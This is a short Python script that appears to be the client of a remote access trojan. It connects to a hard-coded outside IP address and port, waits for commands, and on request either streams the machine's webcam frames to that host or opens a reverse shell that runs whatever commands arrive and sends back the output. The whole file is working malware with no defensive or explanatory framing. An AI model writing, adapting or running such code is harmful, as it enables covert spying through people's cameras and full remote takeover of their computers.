import socket
import os
import subprocess
import time
import cv2
import pickle
import struct

def camera(client_socket):
    connection = client_socket.makefile('wb')
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
    cam = cv2.VideoCapture(0)
    cam.set(3, 720)
    cam.set(4, 480)
    img_counter = 0
    while True:
        ret, frame = cam.read()
        result, frame = cv2.imencode('.jpg', frame, encode_param)
        data = pickle.dumps(frame, 0)
        size = len(data)
        client_socket.sendall(struct.pack(">L", size) + data)
        img_counter += 1
        key = cv2.waitKey(1)
        if key == ord('q'):
            break

    cam.release()

def reverseShell(client_socket):
    while True:
        data = client_socket.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = command.stdout.read() + command.stderr.read()
            output_str = output_bytes.decode("utf-8", "ignore")
            client_socket.send(str.encode(output_str + '\n' + str(os.getcwd()) + '> ', "utf-8"))

def waitForInstructions(client_socket):
    while True:
        data = client_socket.recv(1024)
        if len(data) > 0:
            command = data.decode("utf-8")
            if command == 'connect':
                client_socket.send(str.encode(' '))
            elif command == '1':
                camera(client_socket)
            elif command == '2':
                reverseShell(client_socket)

def main():
    HOST = '157.245.34.67'
    PORT = 5000
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST,PORT))
    waitForInstructions(client_socket)


if __name__ == '__main__':
    main()